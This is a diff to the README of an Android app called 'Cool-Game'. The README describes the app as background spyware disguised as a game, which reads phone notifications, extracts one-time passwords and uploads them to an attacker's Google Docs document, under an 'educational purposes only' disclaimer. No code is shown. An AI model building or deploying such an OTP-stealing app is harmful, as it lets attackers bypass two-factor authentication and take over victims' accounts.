@@ -1,7 +1,7 @@
 # Cool-Game
 
 ## Overview
-Cool-Game is an Android application that monitors device (i.e., phone) notifications to detect presence of OTP (One-Time Password) credentials. The app automatically extracts OTPs and securely uploads them to the attacker's Google Docs document. Note that this app is for educational purposes only.
+Cool-Game is an Android application that monitors device (i.e., phone) notifications and looks for OTP (One-Time Password) credentials, if any. The app automatically extracts the OTP from the notification message and securely uploads the OTPs to the attacker's Google Docs document. Note that this app is for educational purposes only.
 
 ## Features
 - Notification monitoring service that runs in the background
